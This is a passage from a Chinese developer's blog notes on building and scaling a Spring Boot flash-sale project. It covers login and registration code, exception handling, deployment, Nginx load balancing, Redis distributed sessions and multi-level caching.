class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> UserModel <span class="title">validatelogin</span><span class="params">(String telphone, String encrptpassword)</span> <span class="keyword">throws</span> BusinessException </span>&#123;</span><br><span class="line">    <span class="comment">//通过手机号获取用户信息</span></span><br><span class="line">    UserDO userDO = userDOMapper.selectByTelphone(telphone);</span><br><span class="line">    <span class="keyword">if</span>(userDO == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.USER_LOGIN_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">    UserPasswordDO userPasswordDO = userPasswordDOMapper.selectByPrimaryKey(userDO.getId());</span><br><span class="line"></span><br><span class="line">    UserModel userModel = convertFromDataObject(userDO, userPasswordDO);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//比对用户信息加密的密码是否与传输进来的密码匹配</span></span><br><span class="line">    <span class="keyword">if</span>(!StringUtils.equals(encrptpassword, userModel.getEncrptPassword()))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.USER_LOGIN_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> userModel;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注册—服务层</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span> <span class="comment">//事务</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(UserModel userModel)</span> <span class="keyword">throws</span> BusinessException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(userModel == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*if(StringUtils.isEmpty(userModel.getName())</span></span><br><span class="line"><span class="comment">            ||userModel.getGender() == null</span></span><br><span class="line"><span class="comment">            ||userModel.getAge() == null</span></span><br><span class="line"><span class="comment">            ||StringUtils.isEmpty(userModel.getTelphone()))&#123;</span></span><br><span class="line"><span class="comment">        throw new BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//使用hibenator参数校验工具</span></span><br><span class="line">    ValidationResult result = validator.validate(userModel);</span><br><span class="line">    <span class="keyword">if</span>(result.isHasErrors())&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR, result.getErrMsg());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入用户表</span></span><br><span class="line">    UserDO userDO = convertFromModel(userModel);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        userDOMapper.insertSelective(userDO);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (DuplicateKeyException ex)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR, <span class="string">"手机号已重复注册"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入密码表，插入前先更新id(id会被mybatis自动更新)</span></span><br><span class="line">    userModel.setId(userDO.getId());</span><br><span class="line"></span><br><span class="line">    UserPasswordDO userPasswordDO = convertPasswordFromModel(userModel);</span><br><span class="line">    userPasswordDOMapper.insertSelective(userPasswordDO);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>登录—控制层</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用户登录接口</span></span><br><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/login"</span>, consumes = CONTENT_TYPE_FORMED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonReturnType <span class="title">login</span><span class="params">(@RequestParam(<span class="string">"telphone"</span>)</span>String telphone,</span></span><br><span class="line"><span class="function">                              @<span class="title">RequestParam</span><span class="params">(<span class="string">"password"</span>)</span>String password) <span class="keyword">throws</span> BusinessException, UnsupportedEncodingException, NoSuchAlgorithmException </span>&#123;</span><br><span class="line">    <span class="comment">//入参校验</span></span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isEmpty(telphone)||StringUtils.isEmpty(password))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用户登录服务，检验是否合法</span></span><br><span class="line">    UserModel userModel = userService.validatelogin(telphone, <span class="keyword">this</span>.EncodeByMD5(password));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将登陆凭证加入到用户登录成功的session内</span></span><br><span class="line">    <span class="keyword">this</span>.httpServletRequest.getSession().setAttribute(<span class="string">"IS_LOGIN"</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">this</span>.httpServletRequest.getSession().setAttribute(<span class="string">"LOGIN_USER"</span>, userModel);</span><br><span class="line">    <span class="keyword">return</span> CommonReturnType.create(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决跨域session共享问题：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhbGFsYTMyMy9hcnRpY2xlL2RldGFpbHMvMTAzNjI1NjI1">https://blog.csdn.net/lalala323/article/details/103625625<i class="fa fa-external-link-alt"></i></span></p><h4 id="for-update-行级锁"><a href="#for-update-行级锁" class="headerlink" title="for update 行级锁"></a>for update 行级锁</h4><blockquote><p><code>for update</code>是一种行级锁，又叫排它锁，一旦用户对某个行施加了行级加锁，则该用户可以查询也可以更新被加锁的数据行，其它用户只能查询但不能更新被加锁的数据行．如果其它用户想更新该表中的数据行，则也必须对该表施加行级锁．即使多个用户对一个表均使用了共享更新，但也不允许两个事务同时对一个表进行更新，真正对表进行更新时，是以独占方式锁表，一直到提交或复原该事务为止。行锁永远是独占方式锁。</p></blockquote><p>只有当出现如下之一的条件，才会释放共享更新锁：<br>1、执行提交（COMMIT）语句<br>2、退出数据库（LOG　OFF）<br>3、程序停止运行</p><h4 id="Joda-Time-时间API"><a href="#Joda-Time-时间API" class="headerlink" title="Joda-Time 时间API"></a>Joda-Time 时间API</h4><p>使用该日期处理类替代java自带的，参考<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BzaDE4NTEzMjM0NjMzL2FydGljbGUvZGV0YWlscy83OTQwODA5Ng==">https://blog.csdn.net/psh18513234633/article/details/79408096<i class="fa fa-external-link-alt"></i></span></p><h2 id="项目回顾"><a href="#项目回顾" class="headerlink" title="项目回顾"></a>项目回顾</h2><blockquote><p>推荐在SpringMVC架构中，领域模型使用<code>贫血模型</code>，即只提供对应属性的getter和setter方法，将后端处理逻辑放在service层</p></blockquote><h4 id="统一的异常处理器"><a href="#统一的异常处理器" class="headerlink" title="统一的异常处理器"></a>统一的异常处理器</h4><blockquote><p>在之前的项目中，异常处理器设置在BaseController基类中，由其它Controller继承该基类从而实现异常处理，这样存在的问题是，<strong>无法拦截不进入Controller的异常</strong>，所以需要使用Spring切面编程来拦截<code>GlobalExceptionHandler</code></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GlobalExceptionHandler</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler</span>(Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    @<span class="title">ResponseBody</span></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">CommonReturnType</span> <span class="title">doError</span>(<span class="title">HttpServletRequest</span> <span class="title">httpServletRequest</span></span></span><br><span class="line"><span class="class">            , <span class="title">HttpServletResponse</span> <span class="title">httpServletResponse</span></span></span><br><span class="line"><span class="class">            , <span class="title">Exception</span> <span class="title">ex</span>)</span>&#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">        Map&lt;String, Object&gt; responseData = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(ex <span class="keyword">instanceof</span> BusinessException)&#123;</span><br><span class="line">            BusinessException businessException = (BusinessException)ex;</span><br><span class="line">            responseData.put(<span class="string">"errCode"</span>, businessException.getErrCode());</span><br><span class="line">            responseData.put(<span class="string">"errMsg"</span>, businessException.getErrMsg());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ex <span class="keyword">instanceof</span> ServletRequestBindingException)&#123;</span><br><span class="line">            <span class="comment">//即url参数丢失</span></span><br><span class="line">            responseData.put(<span class="string">"errCode"</span>, EmBusinessError.UNKONWN_ERROR.getErrCode());</span><br><span class="line">            responseData.put(<span class="string">"errMsg"</span>, <span class="string">"url绑定路由问题"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ex <span class="keyword">instanceof</span> NoHandlerFoundException)&#123;</span><br><span class="line">            responseData.put(<span class="string">"errCode"</span>, EmBusinessError.UNKONWN_ERROR.getErrCode());</span><br><span class="line">            responseData.put(<span class="string">"errMsg"</span>, <span class="string">"没有找到对应的访问路径"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            responseData.put(<span class="string">"errCode"</span>, EmBusinessError.UNKONWN_ERROR.getErrCode());</span><br><span class="line">            responseData.put(<span class="string">"errMsg"</span>, EmBusinessError.UNKONWN_ERROR.getErrMsg());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> CommonReturnType.create(responseData, <span class="string">"fail"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在YML文件开启MVC相关异常</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mvc:</span></span><br><span class="line">  <span class="attr">throw-exception-if-no-handler-found:</span> <span class="literal">true</span> <span class="comment">#不存在handler便抛出异常</span></span><br><span class="line"><span class="attr">resources:</span></span><br><span class="line">  <span class="attr">add-mappings:</span> <span class="literal">false</span> <span class="comment">#不允许静态文件映射</span></span><br></pre></td></tr></table></figure><h4 id="云端部署"><a href="#云端部署" class="headerlink" title="云端部署"></a>云端部署</h4><p>项目打包成jar文件，数据库使用mysqldump备份，然后后果scp命令上传到服务器</p><blockquote><p>编写deploy脚本</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup java -Xms150m -Xmx300m -XX:NewSize=200m -XX:MaxNewSize=200m -jar miaosha.jar --spring.config.addition-location=/var/wwww/miaosha/application.yml</span><br></pre></td></tr></table></figure><blockquote><p>后台启动脚本</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./deploy.sh &amp;</span><br></pre></td></tr></table></figure><blockquote><p>查看控制台</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -200f nohup.out</span><br></pre></td></tr></table></figure><h4 id="性能压测"><a href="#性能压测" class="headerlink" title="性能压测"></a>性能压测</h4><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200830164436645.png" alt="Jmeter压测流程" style="zoom:67%"><p>主要关注聚合报告的<code>95线和TPS（QPS）数量</code></p><h4 id="发现并发容量问题"><a href="#发现并发容量问题" class="headerlink" title="发现并发容量问题"></a>发现并发容量问题</h4><blockquote><p>首先使用<code>ps -ef | grep java</code> 命令找到对应进程编号，如1313，然后使用<code>pstree -p 1313 |wc -l</code>查看其线程数量</p></blockquote><p>关于top -H参数的了解：</p><ul><li>CPU一行的：<code>us</code>代表用户态对CPU的占有率，同理<code>sy</code>代表内核态对CPU的占有率</li><li>第一行的：<code>load average</code>代表最近几分钟cpu的加载率，三个数分别代表不同时间段的系统平均负载（一分钟、五 分钟、以及十五分钟），它们的数字当然是越小越好。数字越高，说明服务器的负载越大，这也可能是服务器出现某种问题的信号。</li></ul><hr><p>SpringBoot默认的配置在<code>spring-configuration-metadata.json</code>下，该文件中指定了tomcat默认的线程数量</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200830173253365.png" alt="Tomcat默认配置" style="zoom:67%"><hr><p>Tomcat连接定制</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200830185827384.png" alt="Tomcat开发" style="zoom:67%"><p>编写定制类<code>WebServerConfiguration</code>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**当Spring容器内没有TomcatEmbeddedServletContainerFactory这个bean时，会把此bean加载进来</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/8/30 19:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebServerConfiguration</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">WebServerFactoryCustomizer</span>&lt;<span class="title">ConfigurableWebServerFactory</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(ConfigurableWebServerFactory factory)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用对应工厂类提供给我们的接口定制化我们的tomcat connector</span></span><br><span class="line">        ((TomcatServletWebServerFactory)factory).addConnectorCustomizers(<span class="keyword">new</span> TomcatConnectorCustomizer() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(Connector connector)</span> </span>&#123;</span><br><span class="line">                Http11NioProtocol protocolHandler = (Http11NioProtocol) connector.getProtocolHandler();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//定制化keepalivetimeout,设置30s没有收到请求断开连接</span></span><br><span class="line">                protocolHandler.setKeepAliveTimeout(<span class="number">30000</span>);</span><br><span class="line">                <span class="comment">//当客户端发送超过10000个请求自动断开连接</span></span><br><span class="line">                protocolHandler.setMaxKeepAliveRequests(<span class="number">10000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>容量问题优化</strong>：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200830192231754.png" alt="单Web上限" style="zoom:67%"><p><strong>MySql QPS问题：</strong>Queries Per Second，意思是每秒查询率，是一台服务器每秒能够响应的查询次数（数据库中的每秒执行查询sql的次数），显然，这个不够全面，不能描述增删改，所以，不建议用qps来作为系统性能指标。</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200830195357668.png" alt="MySql数据库QPS问题" style="zoom:67%"><p><strong>MySql TPS问题：</strong>Transactions Per Second，意思是每秒事务数，具体事务的定义，都是人为的，可以一个接口、多个接口、一个业务流程等等。一个事务是指事务内第一个请求发送到接收到最后一个请求的响应的过程，以此来计算使用的时间和完成的事务个数。</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200830200530077.png" alt="MySql数据库TPS问题" style="zoom:67%"><h4 id="分布式扩展"><a href="#分布式扩展" class="headerlink" title="分布式扩展"></a>分布式扩展</h4><p>目标：</p><ul><li>Nginx反向代理负载均衡</li><li>分布式会话管理</li><li>使用redis实现分布式会话存储</li></ul><hr><p>单机容量问题：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831094237735.png" alt="单机容量问题" style="zoom:67%"><p>水平扩展：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831094545441.png" alt="水平扩展" style="zoom:80%"><p>新的架构图：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831094721186.png" alt="Nginx反向代理" style="zoom:50%"><hr><p>Nginx动静分离、反向代理：在Nginx的/resources下存放静态资源，其它请求转发到后端服务器</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831155239617.png" alt="架构图" style="zoom:67%"><p>使用<code>OpenResty</code>工具来简化Nginx的编译配置，因为Nginx不支持动态连接，手动编译的工作量很大，安装流程<span class="exturl" data-url="aHR0cDovL29wZW5yZXN0eS5vcmcvY24vbGludXgtcGFja2FnZXMuaHRtbA==">http://openresty.org/cn/linux-packages.html<i class="fa fa-external-link-alt"></i></span></p><p>使用Ngnix web服务器：</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831163428783.png" alt="image-20200831163428783"></p><blockquote><p><strong>nginx动静分离服务:</strong></p></blockquote><ul><li>location节点其他路径:动态资源用</li><li>location节path特定<code>resources</code>:静态资源路径</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831170225387.png" alt="image-20200831170225387"></p><p>注意反向代理时：<strong>应该将静态网页中的ajax请求设置为Nginx服务器公网IP，千万不能设置为Nginx内网IP</strong>，因为Ajax请求是在公网上发出的，并不能访问局域网。</p><p><code>Tomcat</code>日志配置：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">accesslog:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">directory:</span> <span class="string">/var/www/miaosha/tomcat</span></span><br><span class="line">  <span class="attr">pattern:</span> <span class="string">'%h %l %u %t "%r" %s %b %D'</span></span><br></pre></td></tr></table></figure><p>查看 <code>tail -f tomcat/access_log.2020-08-31.log</code> ：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">172.25.25.161 - - [31/Aug/2020:17:37:41 +0800] "GET /item/get?id=21 HTTP/1.0" 200 447 1226</span><br></pre></td></tr></table></figure><hr><p>开启Ngnix反向代理到内网服务器的<code>长链接</code>：减少tcp握手的消耗</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">upstream backend_server&#123;</span><br><span class="line">        server 172.25.25.160 weight=1;</span><br><span class="line">        server 172.25.25.159 weight=1;</span><br><span class="line">        keepalive 30; #开启长连接</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">location /resources/ &#123;</span><br><span class="line">            alias  /usr/local/openresty/nginx/html/resources/; #alias作用为：命中则替换</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://backend_server;</span><br><span class="line">            proxy_set_header Host $http_host:$proxy_port;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_http_version 1.1; #必须设置http1.1才支持长连接</span><br><span class="line">            proxy_set_header Connection ""; #必须设置为空</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>经Jmeter测试<code>1000个线程循环30次</code>在以下条件：</p><ul><li>mysql服务器：2核8g 20mbps</li><li>秒杀服务器1：2核8g 3mbps</li><li>秒杀服务器2：2核8g 3mbps</li><li>Nginx服务器：2核8g 25mbps</li><li>默认开启内网各服务器之间的长连接</li></ul><p>结果如图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831201908370.png" alt="压测数据"></p><hr><blockquote><p>Nginx高性能服务器的原因：</p></blockquote><ul><li><strong>epoll多路复用</strong></li><li><strong>master worker进程模型</strong></li><li><strong>协程机制</strong></li></ul><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831202350866.png" alt="epoll多路复用" style="zoom:50%"><blockquote><p>select多路复用：</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831202800407.png" alt="select多路复用" style="zoom:67%"><blockquote><p>epoll模型：</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831203415321.png" alt="epoll模型" style="zoom:67%"><p><strong>JDK的NIO模型是借鉴了select模型核epoll建立的，其在linux 2.6以上内核运作时，便采用epoll模型</strong>；Dubbo的netty框架也是基于epoll模型的。</p><hr><blockquote><p>Nginx master-worker进程模型：</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200831203721509.png" alt="image-2020083120372150" style="zoom:67%"><blockquote><p>说明：</p></blockquote><ul><li>master进程负责处理管理员命令和管理worker进程，实际上是worker进程<code>在内存抢占资源锁</code>来连接或拒绝socket请求。</li><li>worker进程只有一个线程，但并不意味着它的效率低，实际上当线程内部没有阻塞操作时，单线程比多线程更快速，<code>worker内部是不允许存在阻塞线程的，阻塞操作（如I/O）必须交给epoll模型</code></li></ul><hr><blockquote><p><code>Nginx</code>协程机制：</p></blockquote><ul><li><strong>依附于线程的内存模型，切换开销小</strong></li><li><strong>遇阻塞及归还执行权，代码同步</strong></li><li><strong>无需加锁</strong></li></ul><p>协程是一个<code>内存模型</code>，本质上还是一个线程，只不过一个线程可以有多个协程，协程不同于线程，<code>协程切换没有CPU的切换开销，只有内存的切换开销。</code> lua/golang语言都有协程机制</p><hr><blockquote><p>会话管理：</p></blockquote><ul><li>基于cookie传输sessionid : java tomcat容器session实现</li><li><strong>基于<code>token</code>传输类似sessionid : java代码session实现</strong>（推荐）</li></ul><p>基于cookie的方式，会在cookie中携带Jsession作为session的id</p><blockquote><p>然而在上面的分布式场景下，上面的两种方式都会存在问题，因为nginx进行轮询时两台tomcat服务器之间的session是无法共享的，会出现不停提示登录的问题。</p></blockquote><hr><p>使用<code>分布式会话</code>：</p><ul><li>基于cookie传输sessionid : java tomcat容器session实现迁移到<br>redis</li><li>基于token传输类似sessionid : java代码session实现迁移到redis</li></ul><blockquote><p>引入POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--redis依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.session<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-session-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>RedisConfig</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@EnableRedisHttpSession</span>(maxInactiveIntervalInSeconds = <span class="number">3600</span>) <span class="comment">//最大存活时间</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意要放入redis中的session数据必须实现<code>序列化接口</code>或者<code>修改redis默认的序列化方式</code></p><blockquote><p><strong>基于token传输：使用token传输可以避免移动设备不支持发送cookie的情况，兼容性更好</strong></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改为若用户登录成功后将对应的登录信息和登录凭证存入redis中</span></span><br><span class="line"><span class="comment">//生成token,使用uuid</span></span><br><span class="line">String uuidToken = UUID.randomUUID().toString();</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立token和用户登录态之间的联系，并设置超时时间</span></span><br><span class="line">redisTemplate.opsForValue().set(uuidToken, userModel);</span><br><span class="line">redisTemplate.expire(uuidToken, <span class="number">1</span>, TimeUnit.HOURS);</span><br><span class="line"></span><br><span class="line"><span class="comment">//下发token</span></span><br><span class="line"><span class="keyword">return</span> CommonReturnType.create(uuidToken);</span><br></pre></td></tr></table></figure><p>前端可以用<code>localStorage</code>存储token</p><h4 id="查询优化之多级缓存"><a href="#查询优化之多级缓存" class="headerlink" title="查询优化之多级缓存"></a>查询优化之多级缓存</h4><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200901155025174.png" alt="image-2020090115502517" style="zoom:67%"><p>多级缓存策略：</p><ul><li><strong>redis缓存</strong> —一级缓存 <strong>集中式的缓存管理</strong></li><li><strong>热点内存本地缓存</strong> —–二级缓存</li><li><strong>nginx proxy cache缓存</strong> —–三级缓存</li><li><strong>nginx lua缓存</strong></li></ul><blockquote><p>redis的sentinel哨兵模式：</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200901162430901.png" alt="image-20200901162430901" style="zoom:80%"><p>一旦sentinel检测到心跳丢失，会切换主从并发送信号给miaosha.jar：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200901162647326.png" alt="image-20200901162647326" style="zoom:80%"><hr><blockquote><p>redis集群cluster模式：是一个雪花状集群，客户端只需要连接任意一台redis服务器即可，一旦某一台机器挂了，redis服务器会自带提示客户端重新拉取状态信息。</p></blockquote><hr><h5 id="商品详情页动态内容实现"><a href="#商品详情页动态内容实现" class="headerlink" title="商品详情页动态内容实现"></a>商品详情页动态内容实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据商品的id到redis内获取</span></span><br><span class="line">ItemModel itemModel = (ItemModel) redisTemplate.opsForValue().get(<span class="string">"item_"</span> + id);</span><br><span class="line"></span><br><span class="line"><span class="comment">//若redis内不存在对应的itemModel，则访问下游service</span></span><br><span class="line"><span class="keyword">if</span>(itemModel == <span class="keyword">null</span>)&#123;</span><br><span class="line">    itemModel = itemService.getItemById(id);</span><br><span class="line">    <span class="comment">//放入redis缓存</span></span><br><span class="line">    redisTemplate.opsForValue().set(<span class="string">"item_"</span> + id, itemModel);</span><br><span class="line">    redisTemplate.expire(<span class="string">"item_"</span> + id, <span class="number">10</span>, TimeUnit.MINUTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>修改redis默认的序列化机制</p></blockquote><p>由于对于秒杀的日期类型使用的<code>JodaTime</code>的<code>DateTime</code>，必须要手动实现其<code>序列化和反序列化</code>到redis的Json String样式。</p><blockquote><p>序列化类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/9/1 17:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JodaDateTimeJsonSerializer</span> <span class="keyword">extends</span> <span class="title">JsonSerializer</span>&lt;<span class="title">DateTime</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(DateTime dateTime, JsonGenerator jsonGenerator, SerializerProvider serializerProvider)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将DateTime转为String</span></span><br><span class="line">        jsonGenerator.writeString(dateTime.toString(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>反序列化类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/9/1 17:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JodaDateTimeJsonDeserializer</span> <span class="keyword">extends</span> <span class="title">JsonDeserializer</span>&lt;<span class="title">DateTime</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DateTime <span class="title">deserialize</span><span class="params">(JsonParser jsonParser, DeserializationContext deserializationContext)</span> <span class="keyword">throws</span> IOException, JsonProcessingException </span>&#123;</span><br><span class="line">        String s = jsonParser.readValueAs(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        DateTimeFormatter dateTimeFormatter = DateTimeFormat.forPattern(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> DateTime.parse(s, dateTimeFormatter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>redis 